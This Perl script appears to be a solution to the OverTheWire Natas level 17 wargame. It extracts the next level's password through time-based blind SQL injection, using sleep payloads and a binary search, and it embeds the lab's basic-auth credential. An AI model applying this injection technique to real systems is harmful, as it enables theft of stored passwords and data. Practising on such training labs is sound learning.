#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;
use Try::Tiny;

my $url = 'http://natas17.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();
my @chars = split('', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');

sub make_request_with {
	my ($index, $char) = @_;
  my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(5) #";

	my $request = POST $url, Content => [ username => $payload ];
	$request->authorization_basic('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw');
  $ua->timeout(4);
	my $response = $ua->request($request);
  die if $response->is_error;
}

sub get_passwd_char_at_index {
	my ($index, $lower_bound, $upper_bound) = @_;

  # recursive condition check
	return $chars[$lower_bound] if ($lower_bound > $upper_bound);

	my $char_index = int( ($lower_bound + $upper_bound) / 2 );

	try {
		make_request_with($index, $chars[$char_index]);
		return get_passwd_char_at_index($index, $lower_bound, $char_index - 1);
	} catch {
		# req timed out, so answer is on upper half
		return get_passwd_char_at_index($index, $char_index + 1, $upper_bound);
	}
}

print "Sploiting...\n";
# we know passwords are 32 in length, so
my $length = @chars;
my $flag = '';
foreach (1..32) {
	$flag .= get_passwd_char_at_index($_, 0, $length - 1);
  print "$flag\n";
}